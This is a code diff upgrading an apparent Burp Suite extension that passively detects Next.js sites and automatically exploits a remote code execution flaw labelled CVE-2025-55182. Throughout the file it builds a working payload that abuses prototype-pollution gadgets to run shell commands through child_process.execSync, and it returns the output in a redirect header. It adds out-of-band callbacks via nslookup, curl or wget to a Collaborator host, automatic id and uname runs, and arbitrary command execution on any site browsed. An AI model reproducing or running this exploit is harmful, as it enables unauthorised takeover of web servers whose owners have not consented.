@@ -10,12 +10,16 @@ import java.util.List;
 import java.util.concurrent.ConcurrentHashMap;
 
 /**
- * CVE-2025-55182 Next.js RCE Passive Scanner
+ * CVE-2025-55182 Next.js RCE Passive Scanner v2.0
  * 
- * 功能：
- * - 被动扫描：自动检测经过 Burp 的 Next.js 站点
- * - 自动利用：发现漏洞后自动执行命令获取结果
- * - 列表展示：表格形式显示所有发现的漏洞站点
+ * Features:
+ * - Passive Scanning: Auto-detect Next.js sites
+ * - DNSLog Detection: Use Burp Collaborator for OOB verification
+ * - Auto Exploit: Execute id/uname on vulnerable targets
+ * - Results Table: Display all findings
+ * 
+ * Author: Cr4at0r
+ * GitHub: https://github.com/Cr4at0r
  */
 public class BurpExtender implements IBurpExtender, ITab, IHttpListener, IContextMenuFactory {
     
@@ -24,19 +28,31 @@ public class BurpExtender implements IBurpExtender, ITab, IHttpListener, IContex
     private PrintWriter stdout;
     private PrintWriter stderr;
     
+    // Burp Collaborator
+    private IBurpCollaboratorClientContext collaborator;
+    
     // UI Components
     private JPanel mainPanel;
     private JTable resultsTable;
     private DefaultTableModel tableModel;
     private JTextArea logArea;
     private JLabel statusLabel;
+    private JCheckBox useDnsLog;
     
     // Track scanned hosts
     private ConcurrentHashMap<String, Boolean> scannedHosts = new ConcurrentHashMap<>();
     private ConcurrentHashMap<String, VulnInfo> vulnerableHosts = new ConcurrentHashMap<>();
     
+    // DNSLog pending checks: collaborator payload -> target info
+    private ConcurrentHashMap<String, PendingCheck> pendingChecks = new ConcurrentHashMap<>();
+    
     // Settings
     private volatile boolean scanEnabled = true;
+    private volatile boolean dnsLogEnabled = true;
+    
+    // Polling thread
+    private Thread pollingThread;
+    private volatile boolean pollingActive = false;
     
     @Override
     public void registerExtenderCallbacks(IBurpExtenderCallbacks callbacks) {
@@ -45,9 +61,17 @@ public class BurpExtender implements IBurpExtender, ITab, IHttpListener, IContex
         this.stdout = new PrintWriter(callbacks.getStdout(), true);
         this.stderr = new PrintWriter(callbacks.getStderr(), true);
         
-        callbacks.setExtensionName("Next.js RCE Scanner");
+        callbacks.setExtensionName("Next.js RCE Scanner v2.0");
         
-        // Register as HTTP listener for passive scanning
+        // Initialize Burp Collaborator
+        try {
+            collaborator = callbacks.createBurpCollaboratorClientContext();
+            stdout.println("[+] Burp Collaborator initialized");
+        } catch (Exception e) {
+            stdout.println("[!] Burp Collaborator not available, using echo mode only");
+        }
+        
+        // Register HTTP listener
         callbacks.registerHttpListener(this);
         
         // Register context menu
@@ -59,19 +83,22 @@ public class BurpExtender implements IBurpExtender, ITab, IHttpListener, IContex
             callbacks.addSuiteTab(this);
         });
         
+        // Start collaborator polling thread
+        startPollingThread();
+        
         printBanner();
     }
     
     private void printBanner() {
         stdout.println("╔════════════════════════════════════════════════════════════╗");
-        stdout.println("║     CVE-2025-55182 Next.js RCE Passive Scanner             ║");
+        stdout.println("║     CVE-2025-55182 Next.js RCE Scanner v2.0                ║");
         stdout.println("║                                                            ║");
         stdout.println("║  Author: Cr4at0r                                           ║");
         stdout.println("║  GitHub: https://github.com/Cr4at0r                        ║");
         stdout.println("║                                                            ║");
+        stdout.println("║  [NEW] DNSLog Detection via Burp Collaborator              ║");
         stdout.println("║  [!] 被动扫描已启动                                         ║");
-        stdout.println("║  [*] 浏览网站时自动检测 Next.js 并测试漏洞                   ║");
-        stdout.println("║  [*] 发现漏洞后自动执行命令并显示结果                        ║");
+        stdout.println("║  [*] 支持两种检测模式: Echo / DNSLog                        ║");
         stdout.println("╚════════════════════════════════════════════════════════════╝");
     }
     
@@ -80,39 +107,69 @@ public class BurpExtender implements IBurpExtender, ITab, IHttpListener, IContex
         mainPanel.setBorder(BorderFactory.createEmptyBorder(10, 10, 10, 10));
         
         // Top panel - Status and controls
-        JPanel topPanel = new JPanel(new FlowLayout(FlowLayout.LEFT));
-        topPanel.setBorder(BorderFactory.createTitledBorder("扫描状态"));
+        JPanel topPanel = new JPanel();
+        topPanel.setLayout(new BoxLayout(topPanel, BoxLayout.Y_AXIS));
         
-        statusLabel = new JLabel("● 被动扫描已启用 - 浏览网站时自动检测");
+        // Status row
+        JPanel statusRow = new JPanel(new FlowLayout(FlowLayout.LEFT));
+        statusRow.setBorder(BorderFactory.createTitledBorder("扫描状态"));
+        
+        statusLabel = new JLabel("● 被动扫描已启用");
         statusLabel.setForeground(new Color(0, 150, 0));
         statusLabel.setFont(new Font("Dialog", Font.BOLD, 14));
-        topPanel.add(statusLabel);
+        statusRow.add(statusLabel);
         
         JCheckBox enableScan = new JCheckBox("启用扫描", true);
         enableScan.addActionListener(e -> {
             scanEnabled = enableScan.isSelected();
-            if (scanEnabled) {
-                statusLabel.setText("● 被动扫描已启用 - 浏览网站时自动检测");
-                statusLabel.setForeground(new Color(0, 150, 0));
-            } else {
-                statusLabel.setText("○ 被动扫描已禁用");
-                statusLabel.setForeground(Color.GRAY);
-            }
+            updateStatusLabel();
         });
-        topPanel.add(enableScan);
+        statusRow.add(enableScan);
+        
+        useDnsLog = new JCheckBox("DNSLog模式", true);
+        useDnsLog.addActionListener(e -> {
+            dnsLogEnabled = useDnsLog.isSelected();
+            updateStatusLabel();
+        });
+        statusRow.add(useDnsLog);
+        
+        if (collaborator == null) {
+            useDnsLog.setEnabled(false);
+            useDnsLog.setSelected(false);
+            dnsLogEnabled = false;
+            statusRow.add(new JLabel("(Collaborator 不可用)"));
+        }
+        
+        topPanel.add(statusRow);
+        
+        // Control row
+        JPanel controlRow = new JPanel(new FlowLayout(FlowLayout.LEFT));
+        controlRow.setBorder(BorderFactory.createTitledBorder("操作"));
         
         JButton clearButton = new JButton("清空结果");
         clearButton.addActionListener(e -> {
             tableModel.setRowCount(0);
             scannedHosts.clear();
             vulnerableHosts.clear();
+            pendingChecks.clear();
             log("[*] 已清空扫描结果");
         });
-        topPanel.add(clearButton);
+        controlRow.add(clearButton);
         
         JButton exportButton = new JButton("导出结果");
         exportButton.addActionListener(e -> exportResults());
-        topPanel.add(exportButton);
+        controlRow.add(exportButton);
+        
+        JLabel pendingLabel = new JLabel("等待 DNS 回调: 0");
+        controlRow.add(pendingLabel);
+        
+        // Update pending count periodically
+        javax.swing.Timer updateTimer = new javax.swing.Timer(2000, e -> {
+            pendingLabel.setText("等待 DNS 回调: " + pendingChecks.size());
+        });
+        updateTimer.start();
+        
+        topPanel.add(controlRow);
         
         mainPanel.add(topPanel, BorderLayout.NORTH);
         
@@ -120,8 +177,7 @@ public class BurpExtender implements IBurpExtender, ITab, IHttpListener, IContex
         JPanel tablePanel = new JPanel(new BorderLayout());
         tablePanel.setBorder(BorderFactory.createTitledBorder("发现的漏洞站点"));
         
-        // Table columns
-        String[] columns = {"#", "目标URL", "状态", "用户信息", "系统信息", "发现时间"};
+        String[] columns = {"#", "目标URL", "检测方式", "状态", "用户信息", "系统信息", "发现时间"};
         tableModel = new DefaultTableModel(columns, 0) {
             @Override
             public boolean isCellEditable(int row, int column) {
@@ -133,13 +189,14 @@ public class BurpExtender implements IBurpExtender, ITab, IHttpListener, IContex
         resultsTable.setFont(new Font("Monospaced", Font.PLAIN, 12));
         resultsTable.setRowHeight(25);
         resultsTable.getColumnModel().getColumn(0).setPreferredWidth(30);
-        resultsTable.getColumnModel().getColumn(1).setPreferredWidth(300);
+        resultsTable.getColumnModel().getColumn(1).setPreferredWidth(280);
         resultsTable.getColumnModel().getColumn(2).setPreferredWidth(80);
-        resultsTable.getColumnModel().getColumn(3).setPreferredWidth(200);
-        resultsTable.getColumnModel().getColumn(4).setPreferredWidth(250);
-        resultsTable.getColumnModel().getColumn(5).setPreferredWidth(150);
+        resultsTable.getColumnModel().getColumn(3).setPreferredWidth(70);
+        resultsTable.getColumnModel().getColumn(4).setPreferredWidth(180);
+        resultsTable.getColumnModel().getColumn(5).setPreferredWidth(220);
+        resultsTable.getColumnModel().getColumn(6).setPreferredWidth(140);
         
-        // Add popup menu to table
+        // Popup menu
         JPopupMenu popup = new JPopupMenu();
         JMenuItem copyUrl = new JMenuItem("复制URL");
         copyUrl.addActionListener(e -> {
@@ -157,7 +214,7 @@ public class BurpExtender implements IBurpExtender, ITab, IHttpListener, IContex
             int row = resultsTable.getSelectedRow();
             if (row >= 0) {
                 String url = (String) tableModel.getValueAt(row, 1);
-                String cmd = JOptionPane.showInputDialog(mainPanel, "输入要执行的命令:", "ls -la");
+                String cmd = JOptionPane.showInputDialog(mainPanel, "输入要执行的命令:", "id");
                 if (cmd != null && !cmd.isEmpty()) {
                     executeCommandOnTarget(url, cmd);
                 }
@@ -168,10 +225,7 @@ public class BurpExtender implements IBurpExtender, ITab, IHttpListener, IContex
         resultsTable.setComponentPopupMenu(popup);
         
         JScrollPane tableScroll = new JScrollPane(resultsTable);
-        tableScroll.setPreferredSize(new Dimension(900, 300));
         tablePanel.add(tableScroll, BorderLayout.CENTER);
-        
-        mainPanel.add(tablePanel, BorderLayout.CENTER);
         
         // Bottom panel - Log
         JPanel logPanel = new JPanel(new BorderLayout());
@@ -184,13 +238,26 @@ public class BurpExtender implements IBurpExtender, ITab, IHttpListener, IContex
         logArea.setForeground(new Color(0, 255, 0));
         
         JScrollPane logScroll = new JScrollPane(logArea);
-        logScroll.setPreferredSize(new Dimension(900, 150));
         logPanel.add(logScroll, BorderLayout.CENTER);
         
-        mainPanel.add(logPanel, BorderLayout.SOUTH);
+        // Split Pane
+        JSplitPane splitPane = new JSplitPane(JSplitPane.VERTICAL_SPLIT, tablePanel, logPanel);
+        splitPane.setResizeWeight(0.7); // 70% for table, 30% for log
         
-        log("[*] 扩展加载完成");
-        log("[*] 被动扫描已启动 - 浏览网站时自动检测 Next.js 漏洞");
+        mainPanel.add(splitPane, BorderLayout.CENTER);
+        
+        log("[*] 扩展加载完成 v2.1");
+        log("[*] 被动扫描已启动 - " + (dnsLogEnabled ? "DNSLog + Echo 双模式" : "Echo 模式"));
+    }
+    
+    private void updateStatusLabel() {
+        if (scanEnabled) {
+            statusLabel.setText("● 被动扫描已启用 (" + (dnsLogEnabled ? "DNSLog" : "Echo") + ")");
+            statusLabel.setForeground(new Color(0, 150, 0));
+        } else {
+            statusLabel.setText("○ 被动扫描已禁用");
+            statusLabel.setForeground(Color.GRAY);
+        }
     }
     
     @Override
@@ -203,16 +270,89 @@ public class BurpExtender implements IBurpExtender, ITab, IHttpListener, IContex
         return mainPanel;
     }
     
-    // ==================== HTTP Listener (被动扫描核心) ====================
+    // ==================== Collaborator Polling ====================
+    
+    private void startPollingThread() {
+        pollingActive = true;
+        pollingThread = new Thread(() -> {
+            while (pollingActive) {
+                try {
+                    Thread.sleep(3000); // Poll every 3 seconds
+                    
+                    if (collaborator != null && !pendingChecks.isEmpty()) {
+                        List<IBurpCollaboratorInteraction> interactions = collaborator.fetchAllCollaboratorInteractions();
+                        
+                        for (IBurpCollaboratorInteraction interaction : interactions) {
+                            String interactionId = interaction.getProperty("interaction_id");
+                            String type = interaction.getProperty("type");
+                            
+                            // Find matching pending check
+                            for (Map.Entry<String, PendingCheck> entry : pendingChecks.entrySet()) {
+                                if (entry.getKey().contains(interactionId) || 
+                                    interaction.getProperty("raw_query") != null && 
+                                    interaction.getProperty("raw_query").contains(entry.getValue().marker)) {
+                                    
+                                    PendingCheck check = entry.getValue();
+                                    pendingChecks.remove(entry.getKey());
+                                    
+                                    log("[+] DNSLog 回调收到! " + check.baseUrl + " (" + type + ")");
+                                    
+                                    // Mark as vulnerable and get more info
+                                    VulnInfo info = new VulnInfo();
+                                    info.url = check.baseUrl;
+                                    info.vulnPath = check.path;
+                                    info.detectionMethod = "DNSLog";
+                                    info.isVulnerable = true;
+                                    info.timestamp = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss").format(new Date());
+                                    
+                                    // Try to get user/system info using echo method
+                                    try {
+                                        String userResult = executeExploit(check.service, check.path, "id");
+                                        if (userResult != null) info.userInfo = userResult.trim();
+                                        
+                                        String sysResult = executeExploit(check.service, check.path, "uname -a");
+                                        if (sysResult != null) {
+                                            info.systemInfo = sysResult.trim();
+                                            if (info.systemInfo.length() > 80) {
+                                                info.systemInfo = info.systemInfo.substring(0, 80) + "...";
+                                            }
+                                        }
+                                    } catch (Exception e) {
+                                        // Ignore
+                                    }
+                                    
+                                    vulnerableHosts.put(check.baseUrl, info);
+                                    addToTable(info);
+                                    
+                                    break;
+                                }
+                            }
+                        }
+                    }
+                    
+                    // Clean up old pending checks (> 60 seconds)
+                    long now = System.currentTimeMillis();
+                    pendingChecks.entrySet().removeIf(e -> now - e.getValue().timestamp > 60000);
+                    
+                } catch (InterruptedException e) {
+                    break;
+                } catch (Exception e) {
+                    // Ignore polling errors
+                }
+            }
+        });
+        pollingThread.setDaemon(true);
+        pollingThread.start();
+    }
+    
+    // ==================== HTTP Listener ====================
     
     @Override
     public void processHttpMessage(int toolFlag, boolean messageIsRequest, IHttpRequestResponse messageInfo) {
-        // Only process responses, not requests
         if (messageIsRequest || !scanEnabled) {
             return;
         }
         
-        // Run in background thread to not block Burp
         new Thread(() -> processResponse(messageInfo)).start();
     }
     
@@ -226,7 +366,6 @@ public class BurpExtender implements IBurpExtender, ITab, IHttpListener, IContex
                 baseUrl += ":" + service.getPort();
             }
             
-            // Skip if already scanned
             if (scannedHosts.containsKey(baseUrl)) {
                 return;
             }
@@ -237,12 +376,10 @@ public class BurpExtender implements IBurpExtender, ITab, IHttpListener, IContex
             String responseStr = helpers.bytesToString(response);
             IResponseInfo responseInfo = helpers.analyzeResponse(response);
             
-            // Check if it's a Next.js site
             if (!isNextJsSite(responseStr, responseInfo)) {
                 return;
             }
             
-            // Mark as scanned
             scannedHosts.put(baseUrl, true);
             log("[*] 检测到 Next.js 站点: " + baseUrl);
             
@@ -251,28 +388,27 @@ public class BurpExtender implements IBurpExtender, ITab, IHttpListener, IContex
             
             if (vulnInfo != null && vulnInfo.isVulnerable) {
                 vulnerableHosts.put(baseUrl, vulnInfo);
-                log("[+] 发现漏洞! " + baseUrl);
-                log("[+] 用户: " + vulnInfo.userInfo);
-                log("[+] 系统: " + vulnInfo.systemInfo);
+                log("[+] 发现漏洞! " + baseUrl + " (" + vulnInfo.detectionMethod + ")");
+                if (vulnInfo.userInfo != null) log("[+] 用户: " + vulnInfo.userInfo);
+                if (vulnInfo.systemInfo != null) log("[+] 系统: " + vulnInfo.systemInfo);
                 
-                // Add to table
                 addToTable(vulnInfo);
-                
-                // Also report to Burp Scanner
                 reportIssue(messageInfo, vulnInfo);
+            } else if (vulnInfo != null && vulnInfo.pendingDnsCheck) {
+                log("[*] 等待 DNSLog 回调: " + baseUrl);
             } else {
                 log("[-] 未发现漏洞: " + baseUrl);
             }
             
         } catch (Exception e) {
-            // Silently ignore errors
+            // Silently ignore
         }
     }
     
     private boolean isNextJsSite(String response, IResponseInfo responseInfo) {
         String[] indicators = {
             "_next/static", "__NEXT_DATA__", "/_next/",
-            "next/dist", "x-nextjs-", "__next", "Next.js"
+            "next/dist", "x-nextjs", "__next", "Next.js"
         };
         
         for (String indicator : indicators) {
@@ -293,54 +429,58 @@ public class BurpExtender implements IBurpExtender, ITab, IHttpListener, IContex
     }
     
     /**
-     * 检测漏洞并自动执行命令获取信息
+     * Check vulnerability: Echo first, then DNSLog if Echo fails
      */
     private VulnInfo checkVulnerability(IHttpService service, String baseUrl) {
         VulnInfo info = new VulnInfo();
         info.url = baseUrl;
         info.timestamp = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss").format(new Date());
         
-        // 生成随机测试字符串
+        String[] paths = {"/apps", "/", "/en", "/api/action", "/login"};
+        
+        // 1. Try Echo detection first (Fast & Direct)
         String testString = generateRandomString(8);
         String testCommand = "echo " + testString;
         
-        // 尝试常见路径 - 与 Python 脚本一致，优先使用 /apps
-        String[] paths = {"/apps", "/", "/en", "/api/action", "/login"};
-        
         for (String path : paths) {
-            log("[*] 测试路径: " + baseUrl + path);
             String result = executeExploit(service, path, testCommand);
             
             if (result != null && result.contains(testString)) {
                 info.isVulnerable = true;
                 info.vulnPath = path;
-                log("[+] 路径有效: " + path);
+                info.detectionMethod = "Echo";
                 
-                // 使用简单命令获取用户信息 - 不使用 shell 重定向
                 String userResult = executeExploit(service, path, "id");
                 if (userResult != null && !userResult.isEmpty()) {
                     info.userInfo = userResult.trim();
-                    log("[+] 获取用户信息成功: " + info.userInfo);
-                } else {
-                    // 尝试 whoami
-                    userResult = executeExploit(service, path, "whoami");
-                    if (userResult != null && !userResult.isEmpty()) {
-                        info.userInfo = userResult.trim();
-                        log("[+] 获取用户信息成功: " + info.userInfo);
-                    }
                 }
                 
-                // 使用简单命令获取系统信息
                 String sysResult = executeExploit(service, path, "uname -a");
                 if (sysResult != null && !sysResult.isEmpty()) {
                     info.systemInfo = sysResult.trim();
                     if (info.systemInfo.length() > 80) {
                         info.systemInfo = info.systemInfo.substring(0, 80) + "...";
                     }
-                    log("[+] 获取系统信息成功: " + info.systemInfo);
                 }
                 
-                return info;
+                // Found via Echo, but continue to DNSLog as requested
+                break; 
+            }
+        }
+        
+        // 2. Always try DNSLog (if enabled) - Run both checks
+        if (dnsLogEnabled && collaborator != null) {
+            for (String path : paths) {
+                if (sendDnsLogPayload(service, baseUrl, path)) {
+                    info.pendingDnsCheck = true;
+                    if (info.isVulnerable) {
+                        log("[*] Echo 成功，继续尝试 DNSLog: " + path);
+                    } else {
+                        log("[*] Echo 失败，尝试 DNSLog: " + path);
+                    }
+                    // Send one DNSLog payload and return to wait for callback
+                    break; 
+                }
             }
         }
         
@@ -348,32 +488,31 @@ public class BurpExtender implements IBurpExtender, ITab, IHttpListener, IContex
     }
     
     /**
-     * 执行漏洞利用并返回结果
-     * 使用与 Python 脚本完全相同的 payload 格式
+     * Send DNSLog detection payload
      */
-    private String executeExploit(IHttpService service, String path, String command) {
+    private boolean sendDnsLogPayload(IHttpService service, String baseUrl, String path) {
         try {
-            // ===== 使用与 Python 脚本完全相同的 payload =====
-            // Python: var res=process.mainModule.require('child_process').execSync('{command} | base64 -w 0').toString().trim();
-            //         throw Object.assign(new Error('NEXT_REDIRECT'),{digest: `NEXT_REDIRECT;push;/login?a=${res};307;`});
+            String payload = collaborator.generatePayload(true);
+            String marker = generateRandomString(6);
             
+            // DNS lookup command: nslookup/curl/wget
+            String command = String.format("nslookup %s.%s || curl %s.%s || wget %s.%s", 
+                marker, payload, marker, payload, marker, payload);
+            
+            // Build payload
             String escapedCommand = command.replace("'", "\\'");
-            
             String prefix = String.format(
-                "var res=process.mainModule.require('child_process').execSync('%s | base64 -w 0').toString().trim();" +
-                ";throw Object.assign(new Error('NEXT_REDIRECT'),{digest: `NEXT_REDIRECT;push;/login?a=${res};307;`});",
+                "var x=process.mainModule.require('child_process').execSync('%s');",
                 escapedCommand
             );
             
-            // 构造与 Python 脚本完全一致的 payload 结构
             String payloadJson = String.format(
                 "{\"then\":\"$1:__proto__:then\",\"status\":\"resolved_model\",\"reason\":-1,\"value\":\"{\\\"then\\\":\\\"$B1337\\\"}\",\"_response\":{\"_prefix\":\"%s\",\"_chunks\":\"$Q2\",\"_formData\":{\"get\":\"$1:constructor:constructor\"}}}",
-                prefix.replace("\\", "\\\\").replace("\"", "\\\"").replace("\n", "\\n")
+                prefix.replace("\\", "\\\\").replace("\"", "\\\"")
             );
             
             String boundary = "----WebKitFormBoundaryx8jO2oVc6SWP3Sad";
             
-            // 构造 multipart body - 与 Python 脚本格式完全一致
             StringBuilder body = new StringBuilder();
             body.append("------").append(boundary).append("\r\n");
             body.append("Content-Disposition: form-data; name=\"0\"\r\n\r\n");
@@ -386,14 +525,71 @@ public class BurpExtender implements IBurpExtender, ITab, IHttpListener, IContex
             body.append("[]").append("\r\n");
             body.append("------").append(boundary).append("--");
             
-            // 构造请求头 - 与 Python 脚本一致
             List<String> headers = new ArrayList<>();
             headers.add("POST " + path + " HTTP/1.1");
             headers.add("Host: " + service.getHost());
             headers.add("Content-Type: multipart/form-data; boundary=----" + boundary);
-            headers.add("User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36 Assetnote/1.0.0");
+            headers.add("User-Agent: Mozilla/5.0");
             headers.add("Next-Action: x");
-            headers.add("Accept: */*");
+            headers.add("Connection: close");
+            
+            byte[] request = helpers.buildHttpMessage(headers, body.toString().getBytes("UTF-8"));
+            callbacks.makeHttpRequest(service, request);
+            
+            // Register pending check
+            PendingCheck check = new PendingCheck();
+            check.baseUrl = baseUrl;
+            check.service = service;
+            check.path = path;
+            check.marker = marker;
+            check.timestamp = System.currentTimeMillis();
+            pendingChecks.put(payload, check);
+            
+            return true;
+            
+        } catch (Exception e) {
+            return false;
+        }
+    }
+    
+    /**
+     * Execute exploit and get result
+     */
+    private String executeExploit(IHttpService service, String path, String command) {
+        try {
+            String escapedCommand = command.replace("'", "\\'");
+            
+            String prefix = String.format(
+                "var res=process.mainModule.require('child_process').execSync('%s | base64 -w 0').toString().trim();" +
+                ";throw Object.assign(new Error('NEXT_REDIRECT'),{digest: `NEXT_REDIRECT;push;/login?a=${res};307;`});",
+                escapedCommand
+            );
+            
+            String payloadJson = String.format(
+                "{\"then\":\"$1:__proto__:then\",\"status\":\"resolved_model\",\"reason\":-1,\"value\":\"{\\\"then\\\":\\\"$B1337\\\"}\",\"_response\":{\"_prefix\":\"%s\",\"_chunks\":\"$Q2\",\"_formData\":{\"get\":\"$1:constructor:constructor\"}}}",
+                prefix.replace("\\", "\\\\").replace("\"", "\\\"").replace("\n", "\\n")
+            );
+            
+            String boundary = "----WebKitFormBoundaryx8jO2oVc6SWP3Sad";
+            
+            StringBuilder body = new StringBuilder();
+            body.append("------").append(boundary).append("\r\n");
+            body.append("Content-Disposition: form-data; name=\"0\"\r\n\r\n");
+            body.append(payloadJson).append("\r\n");
+            body.append("------").append(boundary).append("\r\n");
+            body.append("Content-Disposition: form-data; name=\"1\"\r\n\r\n");
+            body.append("\"$@0\"").append("\r\n");
+            body.append("------").append(boundary).append("\r\n");
+            body.append("Content-Disposition: form-data; name=\"2\"\r\n\r\n");
+            body.append("[]").append("\r\n");
+            body.append("------").append(boundary).append("--");
+            
+            List<String> headers = new ArrayList<>();
+            headers.add("POST " + path + " HTTP/1.1");
+            headers.add("Host: " + service.getHost());
+            headers.add("Content-Type: multipart/form-data; boundary=----" + boundary);
+            headers.add("User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36");
+            headers.add("Next-Action: x");
             headers.add("Connection: close");
             
             byte[] request = helpers.buildHttpMessage(headers, body.toString().getBytes("UTF-8"));
@@ -403,9 +599,7 @@ public class BurpExtender implements IBurpExtender, ITab, IHttpListener, IContex
                 IResponseInfo respInfo = helpers.analyzeResponse(response.getResponse());
                 int statusCode = respInfo.getStatusCode();
                 
-                // 检查响应状态码 - 302, 303, 307 都可能
                 if (statusCode == 302 || statusCode == 303 || statusCode == 307) {
-                    // 先检查 x-action-redirect，再检查 Location
                     String redirectUrl = getHeader(respInfo, "x-action-redirect");
                     if (redirectUrl == null || redirectUrl.isEmpty()) {
                         redirectUrl = getHeader(respInfo, "Location");
@@ -416,22 +610,17 @@ public class BurpExtender implements IBurpExtender, ITab, IHttpListener, IContex
                     }
                 }
                 
-                // 也检查响应体
                 String responseStr = helpers.bytesToString(response.getResponse());
                 java.util.regex.Pattern pattern = java.util.regex.Pattern.compile("/login\\?a=([A-Za-z0-9+/=]+)");
                 java.util.regex.Matcher matcher = pattern.matcher(responseStr);
                 if (matcher.find()) {
                     String encoded = matcher.group(1);
-                    try {
-                        return new String(helpers.base64Decode(encoded), "UTF-8");
-                    } catch (Exception e) {
-                        // Ignore
-                    }
+                    return new String(helpers.base64Decode(encoded), "UTF-8");
                 }
             }
             
         } catch (Exception e) {
-            stderr.println("Exploit error: " + e.getMessage());
+            // Ignore
         }
         
         return null;
@@ -441,17 +630,13 @@ public class BurpExtender implements IBurpExtender, ITab, IHttpListener, IContex
         try {
             if (redirectUrl.contains("?a=")) {
                 String encoded = redirectUrl.split("\\?a=")[1];
-                if (encoded.contains("&")) {
-                    encoded = encoded.split("&")[0];
-                }
-                if (encoded.contains(";")) {
-                    encoded = encoded.split(";")[0];
-                }
+                if (encoded.contains("&")) encoded = encoded.split("&")[0];
+                if (encoded.contains(";")) encoded = encoded.split(";")[0];
                 encoded = helpers.urlDecode(encoded);
                 return new String(helpers.base64Decode(encoded), "UTF-8");
             }
         } catch (Exception e) {
-            stderr.println("Extract error: " + e.getMessage());
+            // Ignore
         }
         return null;
     }
@@ -475,7 +660,7 @@ public class BurpExtender implements IBurpExtender, ITab, IHttpListener, IContex
         return sb.toString();
     }
     
-    // ==================== 表格操作 ====================
+    // ==================== Table Operations ====================
     
     private void addToTable(VulnInfo info) {
         SwingUtilities.invokeLater(() -> {
@@ -483,6 +668,7 @@ public class BurpExtender implements IBurpExtender, ITab, IHttpListener, IContex
             Object[] row = {
                 rowNum,
                 info.url,
+                info.detectionMethod != null ? info.detectionMethod : "N/A",
                 "存在漏洞",
                 info.userInfo != null ? info.userInfo : "N/A",
                 info.systemInfo != null ? info.systemInfo : "N/A",
@@ -529,13 +715,13 @@ public class BurpExtender implements IBurpExtender, ITab, IHttpListener, IContex
         
         for (int i = 0; i < tableModel.getRowCount(); i++) {
             sb.append("URL: ").append(tableModel.getValueAt(i, 1)).append("\n");
-            sb.append("User: ").append(tableModel.getValueAt(i, 3)).append("\n");
-            sb.append("System: ").append(tableModel.getValueAt(i, 4)).append("\n");
-            sb.append("Time: ").append(tableModel.getValueAt(i, 5)).append("\n");
+            sb.append("Detection: ").append(tableModel.getValueAt(i, 2)).append("\n");
+            sb.append("User: ").append(tableModel.getValueAt(i, 4)).append("\n");
+            sb.append("System: ").append(tableModel.getValueAt(i, 5)).append("\n");
+            sb.append("Time: ").append(tableModel.getValueAt(i, 6)).append("\n");
             sb.append("---\n");
         }
         
-        // Copy to clipboard
         java.awt.Toolkit.getDefaultToolkit().getSystemClipboard()
             .setContents(new java.awt.datatransfer.StringSelection(sb.toString()), null);
         
@@ -576,7 +762,7 @@ public class BurpExtender implements IBurpExtender, ITab, IHttpListener, IContex
         return menuItems;
     }
     
-    // ==================== 日志 ====================
+    // ==================== Logging ====================
     
     private void log(String message) {
         SwingUtilities.invokeLater(() -> {
@@ -587,15 +773,25 @@ public class BurpExtender implements IBurpExtender, ITab, IHttpListener, IContex
         stdout.println(message);
     }
     
-    // ==================== 数据类 ====================
+    // ==================== Data Classes ====================
     
     class VulnInfo {
         String url;
         boolean isVulnerable = false;
+        boolean pendingDnsCheck = false;
         String vulnPath;
         String userInfo;
         String systemInfo;
         String timestamp;
+        String detectionMethod;
+    }
+    
+    class PendingCheck {
+        String baseUrl;
+        IHttpService service;
+        String path;
+        String marker;
+        long timestamp;
     }
     
     // ==================== Scan Issue ====================
@@ -631,8 +827,7 @@ public class BurpExtender implements IBurpExtender, ITab, IHttpListener, IContex
         
         @Override
         public String getIssueBackground() {
-            return "A Remote Code Execution vulnerability exists in Next.js Server Actions. " +
-                   "An attacker can exploit prototype pollution in the form data parser to execute arbitrary commands.";
+            return "A Remote Code Execution vulnerability exists in Next.js Server Actions.";
         }
         
         @Override
@@ -644,21 +839,18 @@ public class BurpExtender implements IBurpExtender, ITab, IHttpListener, IContex
         public String getIssueDetail() {
             StringBuilder sb = new StringBuilder();
             sb.append("<p><b>CVE-2025-55182 - Next.js Remote Code Execution</b></p>");
-            sb.append("<p>The target application is running a vulnerable version of Next.js.</p>");
-            sb.append("<p><b>Exploitation Results:</b></p>");
+            sb.append("<p><b>Detection Method:</b> ").append(vulnInfo.detectionMethod).append("</p>");
             sb.append("<ul>");
             sb.append("<li><b>User:</b> ").append(escapeHtml(vulnInfo.userInfo)).append("</li>");
             sb.append("<li><b>System:</b> ").append(escapeHtml(vulnInfo.systemInfo)).append("</li>");
-            sb.append("<li><b>Vulnerable Path:</b> ").append(vulnInfo.vulnPath).append("</li>");
+            sb.append("<li><b>Path:</b> ").append(vulnInfo.vulnPath).append("</li>");
             sb.append("</ul>");
             return sb.toString();
         }
         
         @Override
         public String getRemediationDetail() {
-            return "1. Update Next.js to the latest patched version<br>" +
-                   "2. Review and sanitize all user inputs<br>" +
-                   "3. Implement proper Content Security Policy";
+            return "Update Next.js to the latest patched version.";
         }
         
         @Override
